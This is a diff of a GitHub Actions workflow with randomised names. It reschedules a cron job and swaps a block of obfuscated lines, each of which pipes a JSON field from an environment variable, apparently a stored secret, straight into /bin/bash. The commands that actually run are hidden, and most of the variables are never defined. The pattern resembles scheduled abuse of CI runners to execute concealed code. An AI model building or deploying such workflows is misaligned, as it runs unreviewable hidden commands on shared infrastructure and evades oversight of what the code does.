@@ -3,8 +3,7 @@ name: duansiqi9831
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
-
+    - cron: '5 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: duansiqi9831
         env:
-          wi8772: ${{ secrets.wi8772 }}
+          x669: ${{ secrets.x669 }}
         run: |
-          echo $wi8772 | jq -r .lwjc360 | /bin/bash
-          echo $llkk9319 | jq -r .jhp0 | /bin/bash
-          echo $e7 | jq -r .eudm5254 | /bin/bash
-          echo $xfx9 | jq -r .m16 | /bin/bash
-          echo $oec9 | jq -r .mp41542 | /bin/bash
-          echo $oszrp856 | jq -r .tsoq92 | /bin/bash
-          echo $mytw00 | jq -r .fdade0 | /bin/bash
-          echo $qct25 | jq -r .uv95 | /bin/bash
-          echo $izqj38301 | jq -r .ra53 | /bin/bash
+          echo $x669 | jq -r .mtr23 | /bin/bash
+          echo $sd86 | jq -r .wyqu83902 | /bin/bash
+          echo $bv0 | jq -r .jrr38894 | /bin/bash
+          echo $nw258 | jq -r .jal9 | /bin/bash
+          echo $gfi61 | jq -r .u509 | /bin/bash
+          echo $nsw54 | jq -r .m734 | /bin/bash
+          echo $rrqf412 | jq -r .xwa9 | /bin/bash
+          echo $ltm5315 | jq -r .xw56347 | /bin/bash
+          echo $dyocy66108 | jq -r .pfjz97 | /bin/bash
+          echo $tbtv5 | jq -r .jovxk68513 | /bin/bash
 
